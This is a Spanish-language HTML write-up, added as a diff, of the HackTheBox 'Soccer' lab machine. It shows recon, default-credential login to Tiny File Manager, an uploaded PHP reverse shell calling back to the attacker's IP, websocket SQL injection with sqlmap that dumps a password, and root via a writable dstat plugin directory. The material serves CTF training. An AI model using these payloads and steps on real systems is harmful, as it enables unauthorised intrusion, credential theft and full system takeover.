@@ -1,0 +1,282 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Soccer HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/soccer.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Soccer HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Soccer de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Soccer de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Soccer HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Soccer HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Soccer de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Soccer HackTheBox</h1>
+          <p>Resolución de la máquina Soccer de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.194
+Nmap scan report for 10.10.11.194
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9091/tcp open  xmltec-xmlmail</span>
+</code></pre></div></div>
+
+<div><p>Mirando la cabecera Location al hacer una petición curl podemos ver el dominio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s 10.10.11.194 -I | </span><span class="s2">grep</span><span class="p"> Location
+Location: </span><span class="kd">http://soccer.htb/</span>
+</code></pre></div></div>
+
+<div><p>Buscando directorios con gobuster encontramos la ruta /tiny</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Url:                     http://soccer.htb
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/tiny</span><span class="p">                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]</span>
+</code></pre></div></div>
+
+<div><p>Mirandolo desde el navegador parece un login de Tiny File Manager</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Buscando credenciales por defecto encontramos las credenciales admin:admin@123</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Podemos usar las credenciales de admin en el login y entrar</p></div>
+<div><p><img src="./3.png"><p></div>
+<div><p>Al entrar podemos ver los archivos de la web y del directorio tiny</p></div>
+<div><p><img src="./4.png"><p></div>
+<div><p>Entramos a tiny y encontramos otro directorio llamado uploads</p></div>
+<div><p><img src="./5.png"><p></div>
+<div><p>El directorio esta vacio pero podemos ver un botón de upload</p></div>
+<div><p><img src="./6.png"><p></div>
+<div><p>Ahora subimos un shell.php con la estructura de una reverse shell</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    </span><span class="k">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span><span class="p">)
+?></span>
+</code></pre></div></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Invocamos nuestro shell.php y recibimos la reverse shell como www-data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> soccer.htb/tiny/uploads/shell.php
+</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.194
+</span><span class="s2">www-data@soccer</span><span class="p">:</span><span class="na">~/html/tiny/uploads</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@soccer</span><span class="p">:</span><span class="na">~/html/tiny/uploads</span><span class="p">$ ifconfig | grep "inet "
+        inet 10.10.11.194  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet 127.0.0.1  netmask 255.0.0.0
+</span><span class="s2">www-data@soccer</span><span class="p">:</span><span class="na">~/html/tiny/uploads</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Habiamos visto el puerto 9091, es un web socket podemos comprobarlo con websocat</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ websocat </span><span class="p">ws://soccer.htb:9091 -v
+[INFO  websocat::lints] Auto-inserting the line mode
+[INFO  websocat::stdio_threaded_peer] get_stdio_peer (threaded)
+[INFO  websocat::ws_client_peer] get_ws_client_peer
+[INFO  websocat::ws_client_peer] Connected to ws</span>
+</code></pre></div></div>
+
+<div><p>Buscando vulnerabilidades podemos dar con el siguiente <a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">articulo </a>que nos muestra como hacer una sql injection al web socket redirigiendo con un script la petición http al ws</p></div>
+
+<div><p>Usaremos el script pero es necesario cambiar las siguientes 2 lineas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">ws_server </span><span class="kd">=</span><span class="s2"> "ws://localhost:8156/ws"</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">ws_server </span><span class="kd">=</span><span class="s2"> "ws://soccer.htb:9091/"</span>           
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">    data </span><span class="kd">=</span><span class="s2"> '{"employeeID":"%s"}'</span><span class="kd"> %</span><span class="p"> message</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">    data </span><span class="kd">=</span><span class="s2"> '{"id":"%s"}'</span><span class="kd"> %</span><span class="p"> message</span>
+</code></pre></div></div>
+
+<div><p>Ahora ejecutamos el exploit para empezar a redirigir las peticiónes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[+] Starting MiddleWare Server
+[+] Send payloads in http://localhost:8081/?id=*</span>
+</code></pre></div></div>
+
+<div><p>Con sqlmap apuntaremos a nuestro localhost, iniciamos enumerando bases de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap </span><span class="p">-u</span><span class="no"> "http://127.0.0.1:8081/?id=1"</span><span class="p"> --batch -dbs
+&lt......................>
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] </span><span class="kd">soccer_db</span><span class="p">
+[*] sys</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver la base de datos soccer_db, ahora enumeramos las tablas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap </span><span class="p">-u</span><span class="no"> "http://127.0.0.1:8081/?id=1"</span><span class="p"> --batch -D soccer_db -tables
+&lt......................>
+Database: soccer_db
+[1 table]
++----------+
+| </span><span class="kd">accounts</span><span class="p"> |
++----------+</span>
+</code></pre></div></div>
+
+<div><p>Solo hay una tabla, asi que enumeramos las columnas de la tabla accounts</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap </span><span class="p">-u</span><span class="no"> "http://127.0.0.1:8081/?id=1"</span><span class="p"> --batch -D soccer_db -T accounts -columns
+&lt.........................>
+Database: soccer_db
+Table: accounts
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| email    | varchar(40) |
+| id       | int         |
+| </span><span class="kd">password</span><span class="p"> | varchar(40) |
+| </span><span class="kd">username</span><span class="p"> | varchar(40) |
++----------+-------------+</span>
+</code></pre></div></div>
+
+<div><p>Nos centraremos solo en los campos username y password, asi que los dumpeamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap </span><span class="p">-u</span><span class="no"> "http://127.0.0.1:8081/?id=1"</span><span class="p"> --batch -D soccer_db -T accounts -C username,password -dump
+&lt..................................>
+Database: soccer_db
+Table: accounts
+[1 entry]
++----------+----------------------+
+| username | password             |
++----------+----------------------+
+| </span><span class="na">player</span><span class="p">   | </span><span class="kd">PlayerOftheMatch2022</span><span class="p"> |
++----------+----------------------+</span>
+</code></pre></div></div>
+
+<div><p>Tenemos las credenciales del usuario player, asi que nos conectamos por ssh</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">player@10.10.11.194
+player@10.10.11.194's password: </span><span class="kd">PlayerOftheMatch2022</span><span class="p">
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1001(player) gid=1001(player) groups=1001(player)
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+d85**************************e59
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando binarios suid nos topamos con doas al inicio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null
+</span><span class="kd">/usr/local/bin/doas</span><span class="p">
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/at
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En la ruta /usr/local ademas de /bin con doas suid podemos ver /etc con un doas.conf</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">player@soccer</span><span class="p">:</span><span class="na">/usr/local/etc</span><span class="p">$ cat doas.conf 
+permit nopass player as root cmd </span><span class="kd">/usr/bin/dstat</span><span class="p">
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">/usr/local/etc</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Nos dice que podemos ejecutar dstat como root sin proporcionar contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$ doas -u root /usr/bin/dstat
+You did not select any stats, using -cdngy by default.
+</span><span class="na">--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
+usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw </span><span class="p">
+</span><span class="kd">  1</span><span class="c">   0</span><span class="s2">  99</span><span class="c">   0   0</span><span class="na">|</span><span class="no">  30</span><span class="c">k </span><span class="no">  14</span><span class="c">k</span><span class="na">| </span><span class="c">  0     0 </span><span class="na">|</span><span class="c">   0     0</span><span class="na"> |</span><span class="kd"> 243   475</span>
+</code></pre></div></div>
+
+<div><p>Tenemos capacidad de escritura en la ruta share/dstat, donde se guardan los plugins</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -la /usr/local/share/dstat
+drwxr</span><span class="kd">w</span><span class="p">x--- 2 root </span><span class="kd">player</span><span class="p"> 4096 Dec 12 14:53 </span><span class="na">.</span><span class="p">
+drwxr-xr-x 6 root root   4096 Nov 17 09:16 </span><span class="na">..
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Simplemente creamos un archivo en python que vuelva la bash suid y lo ejecutamos como plugin</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">player@soccer</span><span class="p">:</span><span class="na">/usr/local/share/dstat</span><span class="p">$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">/usr/local/share/dstat</span><span class="p">$ doas -u root /usr/bin/dstat --privesc &>/dev/null
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">/usr/local/share/dstat</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al mirar los privilegios de la bash podemos verla suid, la ejecutamos con -p y somos root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 </span><span class="kd">/bin/bash</span><span class="p">
+</span><span class="s2">player@soccer</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt 
+694**************************8b4
+bash-5.0#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
